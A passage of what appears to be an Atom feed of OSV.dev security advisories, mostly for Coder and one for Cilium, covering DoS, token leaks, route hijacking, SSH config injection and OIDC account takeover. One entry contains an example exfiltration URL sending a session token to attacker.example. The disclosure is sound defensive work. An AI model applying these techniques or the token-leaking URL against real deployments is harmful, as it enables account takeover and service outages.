+An authenticated member-level user could POST a very large or chunked body to an AI Bridge provider endpoint such as `/api/v2/aibridge/anthropic/v1/messages`, growing heap memory until the operating system terminates the process. Because AI Bridge runs in-process with `coderd`, this crashes the entire control plane, including the API, workspace coordinator and DERP relay. It requires an authenticated user and the AI Bridge feature …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-f5vp-w269-392g"&gt;https://github.com/coder/coder/security/advisories/GHSA-f5vp-w269-392g&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26164"&gt;https://github.com/coder/coder/pull/26164&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-f5vp-w269-392g"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-v54h-cp2w-9x4g: Coder's session token leaked to arbitrary hosts via `coder open app` for external workspace apps</title>
+    <id>https://osv.dev/vulnerability/GHSA-v54h-cp2w-9x4g</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-v54h-cp2w-9x4g"/>
+    <published>2026-07-06T21:07:40Z</published>
+    <updated>2026-07-06T21:15:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55431"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder&amp;#x27;s session token leaked to arbitrary hosts via `coder open app` for external workspace apps&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55431&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+`coder open app` opens external workspace-app URLs without validating the scheme or host. When an external app URL contains the `$SESSION_TOKEN` placeholder the CLI replaces it with the user&amp;#x27;s real session token before handing the URL to the OS open handler.
+
+&amp;gt; **Note:** Practical exploitation requires the victim to run `coder open app` against a workspace whose external app definition the attacker controls. Only a malicious template author can control external app URLs.
+
+### Impact
+
+Workspace code can register external apps with arbitrary URLs so an attacker who controls workspace contents can define a URL like `https://attacker.example/?t=$SESSION_TOKEN`. Running `coder open app` then sends the user&amp;#x27;s session token to the attacker and enables full account impersonation for t…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-v54h-cp2w-9x4g"&gt;https://github.com/coder/coder/security/advisories/GHSA-v54h-cp2w-9x4g&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26146"&gt;https://github.com/coder/coder/pull/26146&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-v54h-cp2w-9x4g"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-wrq8-fcv5-8hvp: Coder: Route hijacking through lack of validation of agent-supplied AllowedIPs in tailnet coordinator</title>
+    <id>https://osv.dev/vulnerability/GHSA-wrq8-fcv5-8hvp</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-wrq8-fcv5-8hvp"/>
+    <published>2026-07-06T20:58:30Z</published>
+    <updated>2026-07-06T21:15:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55428"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder: Route hijacking through lack of validation of agent-supplied AllowedIPs in tailnet coordinator&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55428&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+The tailnet coordinator validates that an agent&amp;#x27;s `Addresses` derive from its authenticated UUID but applies no equivalent check to `AllowedIPs`. The coordinator forwards agent-supplied `AllowedIPs` verbatim to tunnel peers which install them into the WireGuard peer configuration.
+
+### Impact
+
+A malicious workspace agent can advertise arbitrary `AllowedIPs` prefixes including another agent&amp;#x27;s tailnet address. Coder&amp;#x27;s `ServerTailnet` routes to agents by tailnet IP so an agent that claims a victim&amp;#x27;s prefix can intercept web terminal and workspace app traffic and serve spoofed content. Exploitation requires an authenticated user with a running workspace and a modified agent binary.
+
+### Patches
+
+The fix validates each `AllowedIPs` prefix against the authenticating agent&amp;#x27;s UUID jus…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-wrq8-fcv5-8hvp"&gt;https://github.com/coder/coder/security/advisories/GHSA-wrq8-fcv5-8hvp&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26144"&gt;https://github.com/coder/coder/pull/26144&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-wrq8-fcv5-8hvp"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-jqj2-x4c5-jfxm: Coder: Devcontainer recreate endpoint missing write authorization allows read-only roles to destroy containers</title>
+    <id>https://osv.dev/vulnerability/GHSA-jqj2-x4c5-jfxm</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-jqj2-x4c5-jfxm"/>
+    <published>2026-07-06T21:09:11Z</published>
+    <updated>2026-07-06T21:15:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55433"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder: Devcontainer recreate endpoint missing write authorization allows read-only roles to destroy containers&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55433&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+The devcontainer recreate endpoint relied on route middleware that checked only `ActionRead` on the workspace and, unlike the sibling delete endpoint, performed no `ActionUpdate` check before triggering the destructive rebuild.
+
+&amp;gt; **Note:** Exploitation requires an existing low-privilege role with access to the target workspace.
+
+### Impact
+
+Any authenticated principal with read-only workspace access, such as a Template Admin or Org Template Admin, could recreate a devcontainer, destroying uncommitted in-container state and, if called repeatedly, denying service. This is an authorization bypass leading to data loss and denial of service.
+
+### Patches
+
+The fix adds an explicit `ActionUpdate` authorization check before the agent is dialed like the delete endpoint.
+
+The fix was b…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-jqj2-x4c5-jfxm"&gt;https://github.com/coder/coder/security/advisories/GHSA-jqj2-x4c5-jfxm&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/25812"&gt;https://github.com/coder/coder/pull/25812&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-jqj2-x4c5-jfxm"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-q6h5-q3q6-f87x: CiliumLocalRedirectPolicy addressMatcher allows cross-namespace service traffic hijacking and can break service translation</title>
+    <id>https://osv.dev/vulnerability/GHSA-q6h5-q3q6-f87x</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-q6h5-q3q6-f87x"/>
+    <published>2026-07-06T20:45:38Z</published>
+    <updated>2026-07-06T21:00:10Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-53935"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;CiliumLocalRedirectPolicy addressMatcher allows cross-namespace service traffic hijacking and can break service translation&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-53935&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/cilium/cilium&lt;/code&gt; — fixed in 1.19.4&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/cilium/cilium&lt;/code&gt; — fixed in 1.18.10&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/cilium/cilium&lt;/code&gt; — fixed in 1.17.16&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Impact
+
+Users with the ability to create CiliumLocalRedirectPolicies can specify arbitrary ClusterIPs via addressMatcher, which enables hijacking traffic to Services in any namespace, bypassing the namespace-scoping guarantees enforced by serviceMatcher.
+
+In addition, deleting such a policy can corrupt Cilium&amp;#x27;s internal service state, causing service translation to stop working entirely for the affected Service.
+
+### Patches
+
+This issue affects:
+
+- Cilium v1.19.0 to v1.19.3 inclusive  (fixed in PR #45584)
+- Cilium v1.18.2 to v1.18.9 inclusive (fixed in PR #45585)
+- All versions of Cilium prior to v1.17.16 (fixed in PR #45412)
+
+This issue has been patched in:
+
+- Cilium v1.19.4
+- Cilium v1.18.10
+- Cilium v1.17.16
+
+### Workarounds
+
+There is no workaround to this issue.
+
+### Acknowledgemen…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/cilium/cilium/security/advisories/GHSA-q6h5-q3q6-f87x"&gt;https://github.com/cilium/cilium/security/advisories/GHSA-q6h5-q3q6-f87x&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/cilium/cilium/pull/44512"&gt;https://github.com/cilium/cilium/pull/44512&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/cilium/cilium/pull/44584"&gt;https://github.com/cilium/cilium/pull/44584&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/cilium/cilium/pull/44585"&gt;https://github.com/cilium/cilium/pull/44585&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/cilium/cilium"&gt;https://github.com/cilium/cilium&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-q6h5-q3q6-f87x"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-f962-qm93-mj4c: Coder's unbounded memory allocation in provisioner file upload allows authenticated denial of service</title>
+    <id>https://osv.dev/vulnerability/GHSA-f962-qm93-mj4c</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-f962-qm93-mj4c"/>
+    <published>2026-07-06T20:54:41Z</published>
+    <updated>2026-07-06T21:00:09Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55079"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder&amp;#x27;s unbounded memory allocation in provisioner file upload allows authenticated denial of service&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55079&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+`NewDataBuilder` in `provisionersdk/proto/dataupload.go` allocated a byte slice using the client-supplied `FileSize` from a `DataUpload` message without an upper-bound check. Although the DRPC wire limit is 4 MiB, the `FileSize` value itself was unconstrained
+
+### Impact
+
+An authenticated user able to reach the provisioner daemon serve endpoint could send a roughly 50-byte message declaring a huge `FileSize` (for example 1 TiB), triggering an unrecoverable Go out-of-memory abort that terminates `coderd`. This is a single-message denial of service affecting the entire deployment.
+
+### Patches
+
+The fix validates `FileSize` against an upper bound (`MaxFileSize = 100 MiB`) before allocation.
+
+The fix was backported to all supported release lines:
+
+| Release line | Patched version …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-f962-qm93-mj4c"&gt;https://github.com/coder/coder/security/advisories/GHSA-f962-qm93-mj4c&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/25710"&gt;https://github.com/coder/coder/pull/25710&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-f962-qm93-mj4c"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-mcqq-fqgf-rxwm: Coder vulnerable to SSH config injection via unsanitized server-supplied values in `coder config-ssh`</title>
+    <id>https://osv.dev/vulnerability/GHSA-mcqq-fqgf-rxwm</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-mcqq-fqgf-rxwm"/>
+    <published>2026-07-06T20:53:54Z</published>
+    <updated>2026-07-06T21:00:09Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55427"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder vulnerable to SSH config injection via unsanitized server-supplied values in `coder config-ssh`&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55427&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+`coder config-ssh` wrote server-supplied SSH settings (`HostnameSuffix`, `SSHConfigOptions`) into the user&amp;#x27;s `~/.ssh/config` without sanitizing embedded newlines or restricting directives so a malicious or compromised Coder server could inject arbitrary SSH configuration.
+
+&amp;gt; **Note:** Practical exploitation requires control of the server-supplied values through a malicious or compromised deployment, a man-in-the-middle position or admin access to the `HostnameSuffix` and `SSHConfigOptions` settings.
+
+### Impact
+
+A server administrator or an attacker who controlled the server, could inject a directive such as `ProxyCommand` and achieve arbitrary code execution on any developer workstation that ran `coder config-ssh`. Injected commands ran with the local user&amp;#x27;s privileges and ap…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-mcqq-fqgf-rxwm"&gt;https://github.com/coder/coder/security/advisories/GHSA-mcqq-fqgf-rxwm&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26154"&gt;https://github.com/coder/coder/pull/26154&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-mcqq-fqgf-rxwm"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-9rjw-3gwp-f59v: Coder's workspace app upsert allows cross-workspace agent rebinding via user-controlled app ID</title>
+    <id>https://osv.dev/vulnerability/GHSA-9rjw-3gwp-f59v</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-9rjw-3gwp-f59v"/>
+    <published>2026-07-06T20:55:37Z</published>
+    <updated>2026-07-06T21:00:09Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55429"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder&amp;#x27;s workspace app upsert allows cross-workspace agent rebinding via user-controlled app ID&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55429&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+`UpsertWorkspaceApp` overwrites an existing app&amp;#x27;s `agent_id` on a primary-key conflict and `insertAgentApp` accepts the app ID from the provisioner&amp;#x27;s `CompleteJob` payload without verifying it belongs to the workspace being built. `CompleteJob` runs under `dbauthz.AsProvisionerd` so the authorization layer does not block the cross-workspace upsert.
+
+&amp;gt; **Note:** Exploitation requires elevated access as a template author or external provisioner operator.
+
+### Impact
+
+A user with template authorship or external provisioner access can submit a `CompleteJob` payload with a known victim app UUID and an attacker-controlled agent ID. On completion of the attacker&amp;#x27;s build the victim&amp;#x27;s app row is rebound to the attacker&amp;#x27;s agent so later app traffic such as IDE and terminal sessions is p…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-9rjw-3gwp-f59v"&gt;https://github.com/coder/coder/security/advisories/GHSA-9rjw-3gwp-f59v&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26103"&gt;https://github.com/coder/coder/pull/26103&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-9rjw-3gwp-f59v"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-9r87-mvcw-x35f: Coder vulnerable to OIDC account takeover via email-based user matching and email_verified bypass</title>
+    <id>https://osv.dev/vulnerability/GHSA-9r87-mvcw-x35f</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-9r87-mvcw-x35f"/>
+    <published>2026-07-06T20:52:13Z</published>
+    <updated>2026-07-06T21:00:09Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55075"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder vulnerable to OIDC account takeover via email-based user matching and email_verified bypass&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55075&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+Two flaws in Coder&amp;#x27;s OIDC login chained into account takeover: email-based user matching fell back to linking by email without checking for an existing link to a different IdP subject and the `email_verified` claim was only enforced when present as a boolean `false` so an absent or non-boolean claim was treated as verified.
+
+### Impact
+
+An attacker who could authenticate at the configured OIDC provider with an email matching a victim&amp;#x27;s Coder account could log in as that victim and gain full access to their workspaces, templates and resources. This required OIDC authentication, attacker control of a matching email at the IdP and a victim account not yet linked to a different IdP subject.
+
+### Patches
+
+The fix restricts the email fallback to first-time and legacy linking and def…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-9r87-mvcw-x35f"&gt;https://github.com/coder/coder/security/advisories/GHSA-9r87-mvcw-x35f&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/25712"&gt;https://github.com/coder/coder/pull/25712&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/25713"&gt;https://github.com/coder/coder/pull/25713&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-9r87-mvcw-x35f"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-29xf-69gq-m9jx: Coder: User-admin role can reset owner account password</title>
+    <id>https://osv.dev/vulnerability/GHSA-29xf-69gq-m9jx</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-29xf-69gq-m9jx"/>
+    <published>2026-07-06T20:53:04Z</published>
+    <updated>2026-07-06T21:00:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55077"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder: User-admin role can reset owner account password&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55077&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+The `PUT /api/v2/users/{user}/password` endpoint authorized only `ActionUpdatePersonal` and did not prevent a `user-admin` from resetting an `owner` account&amp;#x27;s password. It also did not require the current password when an admin reset another user&amp;#x27;s password.
+
+&amp;gt; **Note:** Exploitation requires the privileged `user-admin` role so practical risk is limited to deployments that grant `user-admin` to less trusted operators.
+
+### Impact
+
+A `user-admin` could reset any owner&amp;#x27;s password without knowing it, authenticate as that owner and gain full deployment control, including templates, workspaces, licensing, organization settings and the ability to self-assign the `owner` role. This was a privilege escalation from `user-admin` to `owner`.
+
+### Patches
+
+The fix prevents non-owner users…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-29xf-69gq-m9jx"&gt;https://github.com/coder/coder/security/advisories/GHSA-29xf-69gq-m9jx&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/25709"&gt;https://github.com/coder/coder/pull/25709&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-29xf-69gq-m9jx"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-75vm-6w67-gwvp: Coder's OIDC email_verified type coercion bypass enables account takeover via unverified email linking</title>
+    <id>https://osv.dev/vulnerability/GHSA-75vm-6w67-gwvp</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-75vm-6w67-gwvp"/>
+    <published>2026-07-06T20:50:35Z</published>
+    <updated>2026-07-06T21:00:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55076"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder&amp;#x27;s OIDC email_verified type coercion bypass enables account takeover via unverified email linking&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55076&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+Coder&amp;#x27;s OIDC callback checked `email_verified` with a direct Go `bool` type assertion. When an IdP returned the claim as a non-boolean (for example the string `&amp;quot;false&amp;quot;`) or omitted it, the assertion failed open and the email was treated as verified. Combined with an unconditional email-based account fallback, this enabled account takeover.
+
+### Impact
+
+An attacker who registered a victim&amp;#x27;s email at a compatible IdP without verifying it could log in via OIDC and be matched to the victim&amp;#x27;s existing Coder account, receiving a session for that account. No prior authentication to Coder was required and the result was full account takeover.
+
+### Patches
+
